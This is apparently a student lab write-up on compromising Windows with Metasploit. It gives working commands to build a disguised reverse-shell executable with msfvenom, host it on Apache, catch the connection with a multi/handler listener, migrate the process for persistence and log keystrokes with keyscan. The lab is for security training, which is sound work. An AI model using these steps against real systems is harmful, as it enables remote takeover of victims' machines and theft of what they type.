# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

![ifconfig](img/01_ifconfig.png)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![msfvenom](img/02_msfvenom.png)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![copy](img/03_cp.png)

Start apache server
sudo systemctl apache2 start
## OUTPUT:
![start_apache](img/04_start_apache.png)

Check the status of apache2
## OUTPUT:
![apache_status](img/05_apache_status.png)


Invoke msfconsole:
## OUTPUT:
![msfconsole](img/06_msfconsole.png)



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
![help](img/07_help.png)


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
![multi_handler](img/08_multi_handler.png)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

![debian](img/09_debian.png)

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

![run](img/10_run.png)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
![ps_command](img/12_ps_command.png)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

![netstat](img/13_netstat.png)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
![keyscan](img//14_keyscan.png)



keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
![keydump](img/16_keydump.png)
![notepad](img/15_notepad.png)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
